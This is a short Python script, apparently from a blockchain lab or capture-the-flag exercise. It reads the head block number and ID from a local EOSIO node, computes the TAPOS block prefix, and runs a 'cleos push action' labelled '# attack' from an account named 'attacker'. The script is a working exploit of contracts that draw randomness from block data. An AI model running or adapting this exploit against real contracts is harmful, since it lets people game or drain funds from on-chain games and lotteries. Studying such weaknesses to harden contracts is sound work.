import requests
import json
import os
import binascii
import struct

# get tapos block num
url = "http://127.0.0.1:8888/v1/chain/get_info"
response = requests.request("POST", url)
res = json.loads(response.text)
last_block_num = res["head_block_num"]
# get tapos block id
url = "http://127.0.0.1:8888/v1/chain/get_block"
data = {"block_num_or_id":last_block_num}
response = requests.post(url, data=json.dumps(data))
res = json.loads(response.text)
last_block_hash = res["id"]
# get tapos block prefix
block_prefix = struct.unpack("<I", binascii.a2b_hex(last_block_hash)[8:12])[0]
# attack
cmd = '''cleos push action attacker hi '["109","%s","%s"]' -p attacker@owner''' % (str(block_prefix), str(last_block_num))
os.system(cmd)